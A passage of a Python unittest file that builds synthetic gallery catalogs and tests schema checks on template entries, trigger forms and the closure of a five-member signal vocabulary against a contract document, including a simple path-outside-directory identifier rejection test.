# five members long — it does not have to be, and must not be, the real five.
FIXTURE_SIGNALS: tuple[str, ...] = (
    "alpha_signal",
    "beta_signal",
    "gamma_signal",
    "delta_signal",
    "epsilon_signal",
)

# The entry every case that needs one identifier breaks, and its array position.
# Both are read from the pin rather than written twice, so a fixture cannot
# drift from the seed B12 asserts.
FIXTURE_ENTRY_ID = "flowchart"


class CatalogFixtureCase(GalleryFixtureCase):
    """A synthetic gallery carrying a **conforming** catalog.

    Every case below starts from a catalog that passes every check in groups B,
    C, and D, then breaks exactly one thing — so a failure names the defect the
    case introduced rather than the fixture's own noise. Entries are built from
    ``SEEDED_IDS`` rather than from a second list, so the fixture cannot drift
    from the pin B12 asserts.
    """

    def entry(self, index: int, identifier: str, **overrides: object) -> dict:
        """One conforming entry: the nine keys, in FR-007's declaration order."""
        entry: dict = {
            "id": identifier,
            "category": "code-review",
            "title": f"Title {index}",
            "when_to_use": "Guidance a reader uses to decide whether this template fits.",
            "stage": "ad-hoc",
            # The first five entries consume the whole fixture vocabulary, which
            # is what keeps C6 (no unused member) green on the conforming case.
            "trigger": (
                {"any_of": [FIXTURE_SIGNALS[index]]} if index < len(FIXTURE_SIGNALS) else {"always": True}
            ),
            "source": {"origin": "upstream", "file": f"{index:02d}-{identifier}.html"},
            "status": "planned",
            # The first two entries between them consume the whole export
            # vocabulary, so the conforming case also satisfies B14's closure
            # check with no unused kind. Later entries declare read-only, which
            # is the majority case in the real catalog.
            "exports": (
                [EXPORT_KINDS[index]] if index < len(EXPORT_KINDS) else []
            ),
        }
        entry.update(overrides)
        return entry

    def catalog(self, **overrides: object) -> dict:
        return {
            "schema_version": SCHEMA_VERSION,
            "signals": list(FIXTURE_SIGNALS),
            "export_kinds": list(EXPORT_KINDS),
            "templates": [self.entry(index, identifier) for index, identifier in enumerate(SEEDED_IDS)],
            **overrides,
        }

    def write_manifest(self, catalog: dict) -> Path:
        return self.write(MANIFEST_FILE, json.dumps(catalog, indent=2))

    def entry_at(self, catalog: dict, identifier: str) -> dict:
        """The entry carrying one identifier, for a case that breaks exactly it."""
        return catalog["templates"][SEEDED_IDS.index(identifier)]

    def position_of(self, identifier: str) -> str:
        """How a failure names an entry whose own identifier is the defect."""
        return f"templates[{SEEDED_IDS.index(identifier)}]"


class CatalogShapeFixtureTests(CatalogFixtureCase):
    """Group B against synthetic catalogs built in a temporary directory."""

    # -- B1: the top-level keys --

    def test_b1_accepts_exactly_the_four_top_level_keys(self) -> None:
        self.write_manifest(self.catalog())

        self.assertEqual(check_b1(self.gallery), [])

    def test_b1_rejects_a_missing_top_level_key(self) -> None:
        catalog = self.catalog()
        del catalog["signals"]
        self.write_manifest(catalog)

        self.assertReports(check_b1(self.gallery), "top level", "signals")

    def test_b1_rejects_an_extra_top_level_key(self) -> None:
        self.write_manifest(self.catalog(templates_root="templates/"))

        self.assertReports(check_b1(self.gallery), "top level", "templates_root")

    def test_b1_rejects_an_absent_catalog(self) -> None:
        self.assertReports(check_b1(self.gallery), MANIFEST_FILE, "missing")

    def test_b1_rejects_an_unparseable_catalog(self) -> None:
        self.write(MANIFEST_FILE, '{"schema_version": "1.0",}\n')

        self.assertReports(check_b1(self.gallery), MANIFEST_FILE, "unreadable")

    def test_b1_rejects_a_top_level_that_is_not_an_object(self) -> None:
        self.write(MANIFEST_FILE, "[]\n")

        self.assertReports(check_b1(self.gallery), MANIFEST_FILE, "object")

    # -- B2: the schema version --

    def test_b2_accepts_the_declared_version(self) -> None:
        self.write_manifest(self.catalog())

        self.assertEqual(check_b2(self.gallery), [])

    def test_b2_rejects_version_drift(self) -> None:
        self.write_manifest(self.catalog(schema_version="2.0"))

        self.assertReports(check_b2(self.gallery), "schema_version", "2.0")

    # -- B3: the entry count --

    def test_b3_accepts_the_seeded_count(self) -> None:
        self.write_manifest(self.catalog())

        self.assertEqual(check_b3(self.gallery), [])

    def test_b3_rejects_a_short_catalog(self) -> None:
        catalog = self.catalog()
        catalog["templates"].pop()
        self.write_manifest(catalog)

        self.assertReports(check_b3(self.gallery), "templates", "20")

    def test_b3_rejects_a_templates_key_that_is_not_an_array(self) -> None:
        self.write_manifest(self.catalog(templates={}))

        self.assertReports(check_b3(self.gallery), "templates", "dict")

    # -- B4: the nine keys --

    def test_b4_accepts_exactly_the_nine_documented_keys(self) -> None:
        self.write_manifest(self.catalog())

        self.assertEqual(check_b4(self.gallery), [])

    def test_b4_rejects_a_missing_key_and_names_the_entry_by_id(self) -> None:
        catalog = self.catalog()
        del self.entry_at(catalog, FIXTURE_ENTRY_ID)["title"]
        self.write_manifest(catalog)

        self.assertReports(check_b4(self.gallery), f"entry '{FIXTURE_ENTRY_ID}'", "title")

    def test_b4_rejects_a_ninth_key(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["path"] = "templates/flowchart.html"
        self.write_manifest(catalog)

        self.assertReports(check_b4(self.gallery), f"entry '{FIXTURE_ENTRY_ID}'", "path")

    def test_b4_names_an_entry_missing_its_own_id_by_position(self) -> None:
        """Naming by identifier is circular exactly where the identifier is gone."""
        catalog = self.catalog()
        del self.entry_at(catalog, FIXTURE_ENTRY_ID)["id"]
        self.write_manifest(catalog)

        self.assertReports(check_b4(self.gallery), self.position_of(FIXTURE_ENTRY_ID), "id")

    def test_b4_rejects_an_entry_that_is_not_an_object(self) -> None:
        catalog = self.catalog()
        catalog["templates"][SEEDED_IDS.index(FIXTURE_ENTRY_ID)] = FIXTURE_ENTRY_ID
        self.write_manifest(catalog)

        self.assertReports(check_b4(self.gallery), self.position_of(FIXTURE_ENTRY_ID), "nine")

    def test_b4_reports_every_offending_entry(self) -> None:
        catalog = self.catalog()
        for identifier in ("implementation-plan", FIXTURE_ENTRY_ID):
            del self.entry_at(catalog, identifier)["when_to_use"]
        self.write_manifest(catalog)

        failures = check_b4(self.gallery)
        self.assertReports(failures, "entry 'implementation-plan'", "when_to_use")
        self.assertReports(failures, f"entry '{FIXTURE_ENTRY_ID}'", "when_to_use")

    # -- B5 / B6 / B7: the three enums --

    def test_b5_accepts_the_seeded_stages(self) -> None:
        self.write_manifest(self.catalog())

        self.assertEqual(check_b5(self.gallery), [])

    def test_b5_rejects_an_unrecognized_stage(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["stage"] = "pre-pr"
        self.write_manifest(catalog)

        self.assertReports(check_b5(self.gallery), f"entry '{FIXTURE_ENTRY_ID}'", "stage", "pre-pr")

    def test_b6_accepts_the_seeded_categories(self) -> None:
        self.write_manifest(self.catalog())

        self.assertEqual(check_b6(self.gallery), [])

    def test_b6_rejects_an_unrecognized_category(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["category"] = "illustrations"
        self.write_manifest(catalog)

        self.assertReports(check_b6(self.gallery), f"entry '{FIXTURE_ENTRY_ID}'", "category", "illustrations")

    def test_b7_accepts_both_statuses(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["status"] = "shipped"
        self.write_manifest(catalog)

        self.assertEqual(check_b7(self.gallery), [])

    def test_b7_rejects_an_unrecognized_status(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["status"] = "shipping"
        self.write_manifest(catalog)

        self.assertReports(check_b7(self.gallery), f"entry '{FIXTURE_ENTRY_ID}'", "status", "shipping")

    # -- B8: the two prose fields --

    def test_b8_accepts_non_empty_prose(self) -> None:
        self.write_manifest(self.catalog())

        self.assertEqual(check_b8(self.gallery), [])

    def test_b8_rejects_an_empty_title(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["title"] = "   "
        self.write_manifest(catalog)

        self.assertReports(check_b8(self.gallery), f"entry '{FIXTURE_ENTRY_ID}'", "title")

    def test_b8_rejects_guidance_that_is_not_a_string(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["when_to_use"] = None
        self.write_manifest(catalog)

        self.assertReports(check_b8(self.gallery), f"entry '{FIXTURE_ENTRY_ID}'", "when_to_use")

    # -- B9: the identifier --

    def test_b9_accepts_unique_filename_safe_identifiers(self) -> None:
        self.write_manifest(self.catalog())

        self.assertEqual(check_b9(self.gallery), [])

    def test_b9_reports_both_entries_sharing_one_identifier(self) -> None:
        """Story 2 scenario 5, and both offenders are named — by position."""
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["id"] = "implementation-plan"
        self.write_manifest(catalog)

        failures = check_b9(self.gallery)
        self.assertReports(failures, self.position_of("implementation-plan"), "implementation-plan")
        self.assertReports(failures, self.position_of(FIXTURE_ENTRY_ID), "implementation-plan")

    def test_b9_rejects_an_identifier_composing_a_path_outside_templates(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["id"] = "../../brand-kit"
        self.write_manifest(catalog)

        self.assertReports(check_b9(self.gallery), self.position_of(FIXTURE_ENTRY_ID), "../../brand-kit")

    def test_b9_rejects_an_identifier_carrying_a_dot(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["id"] = "flowchart.html"
        self.write_manifest(catalog)

        self.assertReports(check_b9(self.gallery), self.position_of(FIXTURE_ENTRY_ID), "flowchart.html")

    def test_b9_rejects_an_identifier_carrying_whitespace(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["id"] = "flow chart"
        self.write_manifest(catalog)

        self.assertReports(check_b9(self.gallery), self.position_of(FIXTURE_ENTRY_ID), "flow chart")

    def test_b9_rejects_an_identifier_that_is_not_kebab_case(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["id"] = "Flow--Chart-"
        self.write_manifest(catalog)

        self.assertReports(check_b9(self.gallery), self.position_of(FIXTURE_ENTRY_ID), "Flow--Chart-")

    # -- B10: the two source forms --

    def test_b10_accepts_both_source_forms(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["source"] = {"origin": "repository"}
        self.write_manifest(catalog)

        self.assertEqual(check_b10(self.gallery), [])

    def test_b10_rejects_an_unrecognized_origin(self) -> None:
        """It must fail here rather than fall through the attribution checks."""
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["source"] = {"origin": "vendor", "file": "x.html"}
        self.write_manifest(catalog)

        self.assertReports(check_b10(self.gallery), f"entry '{FIXTURE_ENTRY_ID}'", "source", "vendor")

    def test_b10_rejects_an_upstream_source_carrying_no_file(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["source"] = {"origin": "upstream"}
        self.write_manifest(catalog)

        self.assertReports(check_b10(self.gallery), f"entry '{FIXTURE_ENTRY_ID}'", "source", "file")

    def test_b10_rejects_an_upstream_source_whose_file_is_empty(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["source"] = {"origin": "upstream", "file": ""}
        self.write_manifest(catalog)

        self.assertReports(check_b10(self.gallery), f"entry '{FIXTURE_ENTRY_ID}'", "source", "file")

    def test_b10_rejects_a_repository_source_carrying_a_file(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["source"] = {"origin": "repository", "file": "x.html"}
        self.write_manifest(catalog)

        self.assertReports(check_b10(self.gallery), f"entry '{FIXTURE_ENTRY_ID}'", "source", "file")

    def test_b10_rejects_a_source_that_is_not_an_object(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["source"] = "upstream"
        self.write_manifest(catalog)

        self.assertReports(check_b10(self.gallery), f"entry '{FIXTURE_ENTRY_ID}'", "source")

    # -- B11: upstream file uniqueness --

    def test_b11_accepts_distinct_upstream_files(self) -> None:
        self.write_manifest(self.catalog())

        self.assertEqual(check_b11(self.gallery), [])

    def test_b11_reports_both_entries_claiming_one_upstream_file(self) -> None:
        catalog = self.catalog()
        claimed = self.entry_at(catalog, "implementation-plan")["source"]["file"]
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["source"]["file"] = claimed
        self.write_manifest(catalog)

        failures = check_b11(self.gallery)
        self.assertReports(failures, "entry 'implementation-plan'", "source", claimed)
        self.assertReports(failures, f"entry '{FIXTURE_ENTRY_ID}'", "source", claimed)

    # -- B12: the pinned identifier set --

    def test_b12_accepts_the_seeded_identifier_set(self) -> None:
        self.write_manifest(self.catalog())

        self.assertEqual(check_b12(self.gallery), [])

    def test_b12_catches_a_rename_carried_through_to_the_artifact(self) -> None:
        """The coordinated rename every other check misses.

        The identifier is renamed, the entry is flipped to ``shipped``, and the
        derived artifact is created under the new name — so the catalog and the
        artifact directory agree with each other and groups D1 and D3 are both
        green. Only the pin, which is held here rather than read back out of the
        file it validates, sees that the seed changed.
        """
        catalog = self.catalog()
        renamed = self.entry_at(catalog, FIXTURE_ENTRY_ID)
        renamed["id"] = "flow-chart"
        renamed["status"] = "shipped"
        self.write_manifest(catalog)
        self.write(f"{TEMPLATES_DIR}/flow-chart.html", "<!doctype html>\n<html></html>\n")

        self.assertEqual(check_d1(self.gallery), [])
        self.assertEqual(check_d3(self.gallery), [])
        failures = check_b12(self.gallery)
        self.assertReports(failures, FIXTURE_ENTRY_ID, "seeded")
        self.assertReports(failures, "flow-chart", "seeded")

    def test_b13_accepts_declared_export_kinds_including_the_empty_case(self) -> None:
        """The conforming fixture carries both a populated and an empty ``exports``."""
        catalog = self.catalog()
        populated = [entry for entry in catalog["templates"] if entry["exports"]]
        empty = [entry for entry in catalog["templates"] if entry["exports"] == []]
        self.assertTrue(populated, "fixture must exercise a carried export")
        self.assertTrue(empty, "fixture must exercise the read-only case")
        self.write_manifest(catalog)

        self.assertEqual(check_b13(self.gallery), [])

    def test_b13_catches_an_undeclared_kind(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["exports"] = ["csv"]
        self.write_manifest(catalog)

        self.assertReports(check_b13(self.gallery), FIXTURE_ENTRY_ID, "not declared")

    def test_b13_catches_a_missing_exports_key(self) -> None:
        """Absence is the defect this key exists to remove.

        Without the key it is unsaid whether the artifact is deliberately
        read-only or simply unfinished, which is the ambiguity the declaration
        was added to close.
        """
        catalog = self.catalog()
        del self.entry_at(catalog, FIXTURE_ENTRY_ID)["exports"]
        self.write_manifest(catalog)

        self.assertReports(check_b13(self.gallery), FIXTURE_ENTRY_ID, "must be an array")

    def test_b13_catches_a_non_array_and_a_repeat(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["exports"] = "prompt"
        self.entry_at(catalog, SEEDED_IDS[1])["exports"] = ["markdown", "markdown"]
        self.write_manifest(catalog)

        failures = check_b13(self.gallery)
        self.assertReports(failures, FIXTURE_ENTRY_ID, "must be an array")
        self.assertReports(failures, SEEDED_IDS[1], "repeats")

        # A str is iterable. B14 must not walk "prompt" character by character
        # and report five undeclared kinds; B13 above owns that shape, and two
        # checks reporting one defect in different vocabularies is worse than
        # one reporting it precisely.
        self.assertEqual(check_b14(self.gallery), [])

    def test_b14_accepts_a_vocabulary_that_closes(self) -> None:
        self.write_manifest(self.catalog())

        self.assertEqual(check_b14(self.gallery), [])

    def test_b14_catches_a_declared_kind_no_entry_carries(self) -> None:
        catalog = self.catalog(export_kinds=[*EXPORT_KINDS, "csv"])
        self.write_manifest(catalog)

        self.assertReports(check_b14(self.gallery), "csv", "declared but no entry carries it")

    def test_b14_catches_a_carried_kind_the_declaration_omits(self) -> None:
        """The half B13 structurally cannot see.

        B13 reads one entry at a time, so it catches the undeclared member on
        that entry. This states the catalog-wide direction: the declaration is
        the vocabulary, not the union of whatever entries happen to carry.
        """
        catalog = self.catalog(export_kinds=["prompt"])
        self.write_manifest(catalog)

        self.assertReports(check_b14(self.gallery), "markdown", "is not declared")


# ---------------------------------------------------------------------------
# Group C — triggers and signal closure (FR-008, FR-015, FR-016, FR-017)
# ---------------------------------------------------------------------------

# The document carrying what each signal **means**, and the section inside it
# that C8 closes the vocabulary against. Naming the section is not a copy of the
# vocabulary: it locates the headings rather than restating any of them.
SPA_CONTRACT_FILE = "SPA-CONTRACT.md"
SIGNAL_SECTION_HEADING = "## Routing signals"

# C1 is the FR-017 mechanism, and it is **the integer only**. This file holds no
# copy of the five names, because a copy edited in the same change as the
# catalog is not an independent check — it is the catalog, written twice. C1
# catches invention, since the count rises. C5 and C6 catch the disguise of
# removing a real member, since that orphans its consumers. C8 closes the
# remaining space against the documented meanings, which is a second shipped
# artifact rather than a list held here.
SEEDED_SIGNAL_COUNT = 5

# Flat ``snake_case``: lowercase alphanumerics in underscore-separated segments.
# "Flat" is what rejects a dotted or otherwise structured name.
_SNAKE_RE = re.compile(r"[a-z0-9]+(?:_[a-z0-9]+)*")

# A signal's documented meaning is introduced by a level-three heading naming it
# in code style, inside the signal section.
_SIGNAL_HEADING_RE = re.compile(r"^###\s+`([^`]+)`\s*$", re.MULTILINE)


def _signals(gallery_root: Path) -> list | None:
    """The vocabulary array, or ``None`` when B1 or C1 already owns the defect."""
    catalog = _loaded(gallery_root)
    if catalog is None:
        return None
    signals = catalog.get("signals")
    return signals if isinstance(signals, list) else None


def _entry_triggers(gallery_root: Path) -> list[tuple[str, object]]:
    """``(designation, trigger)`` for every entry that carries a trigger."""
    entries = _entries(gallery_root)
    if entries is None:
        return []
    designations = _designations(entries)
    return [
        (designations[index], entry["trigger"])
        for index, entry in enumerate(entries)
        if isinstance(entry, dict) and "trigger" in entry
    ]


def _any_of(trigger: object) -> list | None:
    """The signal set of an ``any_of`` trigger, or ``None`` for any other shape."""
    if isinstance(trigger, dict) and isinstance(trigger.get("any_of"), list):
        return trigger["any_of"]
    return None


def check_c1(gallery_root: Path) -> list[str]:
    """C1 — the vocabulary has exactly five members.

    The integer is the whole assertion. See ``SEEDED_SIGNAL_COUNT`` for why this
    is not a list comparison.
    """
    catalog = _loaded(gallery_root)
    if catalog is None or "signals" not in catalog:
        return []  # B1 owns an absent catalog and an absent key
    signals = catalog["signals"]
    if not isinstance(signals, list):
        return [
            _catalog_failure(
                "top level",
                f"key 'signals': expected an array of {SEEDED_SIGNAL_COUNT} names, "
                f"found {type(signals).__name__}",
            )
        ]
    if len(signals) != SEEDED_SIGNAL_COUNT:
        return [
            _catalog_failure(
                "top level",
                f"key 'signals': expected {SEEDED_SIGNAL_COUNT} names, found {len(signals)} — a signal is "
                "added only by recorded amendment naming the entry that will consume it",
            )
        ]
    return []


def check_c2(gallery_root: Path) -> list[str]:
    """C2 — the vocabulary's members are unique, flat ``snake_case`` strings."""
    signals = _signals(gallery_root)
    if signals is None:
        return []  # C1 owns a vocabulary that is not an array
    failures: list[str] = []
    positions: dict[str, list[int]] = {}
    for index, member in enumerate(signals):
        if not isinstance(member, str):
            failures.append(_catalog_failure(f"signals[{index}]", f"expected a string, found {member!r}"))
            continue
        positions.setdefault(member, []).append(index)
        if not _SNAKE_RE.fullmatch(member):
            failures.append(
                _catalog_failure(
                    f"signals[{index}]",
                    f"'{member}' is not flat snake_case (lowercase alphanumerics in underscore-separated "
                    "segments)",
                )
            )
    for member, found in positions.items():
        if len(found) > 1:
            failures.extend(
                _catalog_failure(
                    f"signals[{index}]",
                    f"'{member}' is also at {', '.join(f'signals[{other}]' for other in found if other != index)}",
                )
                for index in found
            )
    return failures


def check_c3(gallery_root: Path) -> list[str]:
    """C3 — every trigger is exactly one of the two documented forms."""
    failures: list[str] = []
    for where, trigger in _entry_triggers(gallery_root):
        if not isinstance(trigger, dict):
            failures.append(
                _catalog_failure(
                    where,
                    f"field 'trigger': expected an object, found {type(trigger).__name__}",
                )
            )
            continue
        keys = set(trigger)
        if keys == {"always"}:
            if trigger["always"] is not True:
                failures.append(
                    _catalog_failure(
                        where,
                        f"field 'trigger': key 'always': expected true, found {trigger['always']!r} — the "
                        "form carries no negation",
                    )
                )
        elif keys == {"any_of"}:
            if not isinstance(trigger["any_of"], list):
                failures.append(
                    _catalog_failure(
                        where,
                        f"field 'trigger': key 'any_of': expected an array, "
                        f"found {type(trigger['any_of']).__name__}",
                    )
                )
        else:
            failures.append(
                _catalog_failure(
                    where,
                    f"field 'trigger': keys {sorted(keys)} are neither the {{'always': true}} form nor the "
                    "{'any_of': [...]} form — there is no third form, no nesting, no conjunction, and no "
                    "negation",
                )
            )
    return failures


def check_c4(gallery_root: Path) -> list[str]:
    """C4 — every ``any_of`` array is non-empty.

    This is what makes deleting the last signal from an entry fail loudly
    instead of quietly switching that entry's routing off.
    """
    return [
        _catalog_failure(
            where,
            "field 'trigger': key 'any_of': the signal set is empty, so the entry would route on nothing",
        )
        for where, trigger in _entry_triggers(gallery_root)
        if _any_of(trigger) == []
    ]


def check_c5(gallery_root: Path) -> list[str]:
    """C5 — every signal a trigger names is a member of the vocabulary."""
    signals = _signals(gallery_root)
    if signals is None:
        return []  # C1 owns a vocabulary that is not an array
    failures: list[str] = []
    for where, trigger in _entry_triggers(gallery_root):
        named = _any_of(trigger)
        if named is None:
            continue  # C3 owns an unrecognized form
        failures.extend(
            _catalog_failure(
                where,
                f"field 'trigger': names signal {name!r}, which the catalog's vocabulary does not carry",
            )
            for name in named
            if name not in signals
        )
    return failures


def check_c6(gallery_root: Path) -> list[str]:
    """C6 — every member of the vocabulary is named by at least one trigger."""
    signals = _signals(gallery_root)
    if signals is None:
        return []
    named: set[str] = set()
    for _, trigger in _entry_triggers(gallery_root):
        for name in _any_of(trigger) or ():
            if isinstance(name, str):
                named.add(name)
    return [
        _catalog_failure(
            f"signals[{index}]",
            f"'{member}' is named by no trigger, so the vocabulary carries a member nothing routes on",
        )
        for index, member in enumerate(signals)
        if isinstance(member, str) and member not in named
    ]


def check_c7(gallery_root: Path) -> list[str]:
    """C7 — every entry carries a trigger, ``ad-hoc`` entries included.

    An ad-hoc trigger is never evaluated, because the stage filter runs first
    and excludes it. It is still mandatory, so all 21 entries carry one uniform
    validated shape. B4 reports the same key as missing from the nine; this row
    exists in its own right because the obligation is the uniform shape rather
    than the key count.
    """
    entries = _entries(gallery_root)
    if entries is None:
        return []
    designations = _designations(entries)
    return [
        _catalog_failure(
            designations[index],
            "field 'trigger': missing — every entry carries one, ad-hoc entries included",
        )
        for index, entry in enumerate(entries)
        if isinstance(entry, dict) and "trigger" not in entry
    ]


def _section(text: str, heading: str) -> str | None:
    """The body under one level-two heading, up to the next level-two heading."""
    lines = text.splitlines()
    start = next((index for index, line in enumerate(lines) if line.strip() == heading), None)
    if start is None:
        return None
    end = next(
        (index for index in range(start + 1, len(lines)) if lines[index].startswith("## ")),
        len(lines),
    )
    return "\n".join(lines[start + 1 : end])


def _documented_signals(gallery_root: Path) -> tuple[set[str] | None, list[str]]:
    """The names the contract document defines a meaning for, or the failure."""
    path = gallery_root / SPA_CONTRACT_FILE
    if not path.is_file():
        return None, [
            f"{SPA_CONTRACT_FILE}: the document is missing, so the catalog's signal vocabulary is documented "
            "nowhere and the two cannot be closed against each other"
        ]
    documented = _read_exact_or_none(path)
    if documented is None:
        return None, [f"{SPA_CONTRACT_FILE}: is not decodable as UTF-8, so the documented vocabulary cannot be read"]
    section = _section(documented, SIGNAL_SECTION_HEADING)
    if section is None:
        return None, [
            f"{SPA_CONTRACT_FILE}: no '{SIGNAL_SECTION_HEADING}' section, so the documented vocabulary "
            "cannot be read"
        ]
    return {match.group(1) for match in _SIGNAL_HEADING_RE.finditer(section)}, []


def check_c8(gallery_root: Path) -> list[str]:
    """C8 — the vocabulary equals the set of signals the contract documents.

    This is closure between two **shipped artifacts**, the same shape as C5 and
    C6 closing the vocabulary against the triggers — not a second copy of the
    names held in this file, so FR-017's prohibition is untouched. It is the
    only check that makes a coordinated rename visible: renaming a signal in the
    vocabulary and in its consuming trigger together keeps the count at five and
    keeps closure intact in both directions, so C1, C5, and C6 all pass while
    the vocabulary changes underneath its consumers. Only new prose here
    completes the rename.
    """
    signals = _signals(gallery_root)
    if signals is None:
        return []
    documented, unreadable = _documented_signals(gallery_root)
    if documented is None:
        return unreadable
    members = {member for member in signals if isinstance(member, str)}
    return [
        _catalog_failure(
            "signals",
            f"'{name}' is a member that the '{SIGNAL_SECTION_HEADING}' section of {SPA_CONTRACT_FILE} does "
            "not document, so a consumer has the name and not its meaning",
        )
        for name in sorted(members.difference(documented))
    ] + [
        f"{SPA_CONTRACT_FILE}: '{SIGNAL_SECTION_HEADING}' documents '{name}', which the catalog's "
        "vocabulary does not carry"
        for name in sorted(documented.difference(members))
    ]


GROUP_C_CHECKS: tuple[tuple[str, Callable[[Path], list[str]]], ...] = (
    ("C1", check_c1),
    ("C2", check_c2),
    ("C3", check_c3),
    ("C4", check_c4),
    ("C5", check_c5),
    ("C6", check_c6),
    ("C7", check_c7),
    ("C8", check_c8),
)


class TriggerClosureTests(unittest.TestCase):
    """Group C against the shipped catalog and contract document."""

    def test_group_c_passes_against_the_shipped_gallery(self) -> None:
        for name, check in GROUP_C_CHECKS:
            with self.subTest(msg=name):
                self.assertEqual(check(GALLERY_ROOT), [])


# ---------------------------------------------------------------------------
# Group C fixtures — triggers and signal closure (FR-008, FR-015, FR-016, FR-017)
# ---------------------------------------------------------------------------


class TriggerClosureFixtureTests(CatalogFixtureCase):
    """Group C against synthetic catalogs and a synthetic contract document."""

    def setUp(self) -> None:
        super().setUp()
        self.write_contract()

    def write_contract(
        self,
        documented: tuple[str, ...] = FIXTURE_SIGNALS,
        *,
        heading: str = SIGNAL_SECTION_HEADING,
    ) -> Path:
        """A synthetic contract documenting one signal per heading.

        The sections either side carry headings of the same shape, so a reader
        that swept the whole document rather than the signal section would find
        names that are not signals and fail the conforming case — which is what
        makes the passing case evidence that the parse is section-scoped.
        """
        sections = "\n".join(f"### `{name}`\n\n**Means**: prose for {name}.\n" for name in documented)
        return self.write(
            SPA_CONTRACT_FILE,
            "# Contract\n\n"
            "## Catalog shape\n\n"
            "### `stage`\n\nProse about a field, not a signal.\n\n"
            f"{heading}\n\nProse introducing the vocabulary.\n\n"
            f"{sections}\n"
            "## Accessibility obligations\n\n"
            "### `focus-visible`\n\nProse after the signal section ends.\n",
        )

    # -- C1: the member count, and only the count --

    def test_c1_accepts_the_seeded_count(self) -> None:
        self.write_manifest(self.catalog())

        self.assertEqual(check_c1(self.gallery), [])

    def test_c1_rejects_an_invented_signal(self) -> None:
        catalog = self.catalog()
        catalog["signals"].append("zeta_signal")
        self.write_manifest(catalog)

        self.assertReports(check_c1(self.gallery), "signals", "6")

    def test_c1_rejects_a_removed_signal(self) -> None:
        catalog = self.catalog()
        catalog["signals"].pop()
        self.write_manifest(catalog)

        self.assertReports(check_c1(self.gallery), "signals", "4")

    def test_c1_rejects_a_signals_key_that_is_not_an_array(self) -> None:
        self.write_manifest(self.catalog(signals={}))

        self.assertReports(check_c1(self.gallery), "signals", "dict")

    # -- C2: the vocabulary's own form --

    def test_c2_accepts_unique_flat_snake_case_names(self) -> None:
        self.write_manifest(self.catalog())

        self.assertEqual(check_c2(self.gallery), [])

    def test_c2_reports_both_positions_of_a_repeated_name(self) -> None:
        catalog = self.catalog()
        catalog["signals"][3] = catalog["signals"][0]
        self.write_manifest(catalog)

        failures = check_c2(self.gallery)
        self.assertReports(failures, "signals[0]", FIXTURE_SIGNALS[0])
        self.assertReports(failures, "signals[3]", FIXTURE_SIGNALS[0])

    def test_c2_rejects_a_name_that_is_not_snake_case(self) -> None:
        catalog = self.catalog()
        catalog["signals"][2] = "Gamma-Signal"
        self.write_manifest(catalog)

        self.assertReports(check_c2(self.gallery), "signals[2]", "Gamma-Signal")

    def test_c2_rejects_a_name_that_is_not_flat(self) -> None:
        catalog = self.catalog()
        catalog["signals"][2] = "change.gamma"
        self.write_manifest(catalog)

        self.assertReports(check_c2(self.gallery), "signals[2]", "change.gamma")

    def test_c2_rejects_a_name_that_is_not_a_string(self) -> None:
        catalog = self.catalog()
        catalog["signals"][2] = {"name": "gamma_signal"}
        self.write_manifest(catalog)

        self.assertReports(check_c2(self.gallery), "signals[2]")

    # -- C3: the two trigger forms --

    def test_c3_accepts_both_trigger_forms(self) -> None:
        self.write_manifest(self.catalog())

        self.assertEqual(check_c3(self.gallery), [])

    def test_c3_rejects_a_third_form(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["trigger"] = {"all_of": [FIXTURE_SIGNALS[0]]}
        self.write_manifest(catalog)

        self.assertReports(check_c3(self.gallery), f"entry '{FIXTURE_ENTRY_ID}'", "trigger", "all_of")

    def test_c3_rejects_a_negated_always(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["trigger"] = {"always": False}
        self.write_manifest(catalog)

        self.assertReports(check_c3(self.gallery), f"entry '{FIXTURE_ENTRY_ID}'", "trigger", "always")

    def test_c3_rejects_a_trigger_carrying_both_forms(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["trigger"] = {"always": True, "any_of": [FIXTURE_SIGNALS[0]]}
        self.write_manifest(catalog)

        self.assertReports(check_c3(self.gallery), f"entry '{FIXTURE_ENTRY_ID}'", "trigger")

    def test_c3_rejects_an_any_of_that_is_not_an_array(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["trigger"] = {"any_of": FIXTURE_SIGNALS[0]}
        self.write_manifest(catalog)

        self.assertReports(check_c3(self.gallery), f"entry '{FIXTURE_ENTRY_ID}'", "trigger", "any_of")

    def test_c3_rejects_a_trigger_that_is_not_an_object(self) -> None:
        catalog = self.catalog()
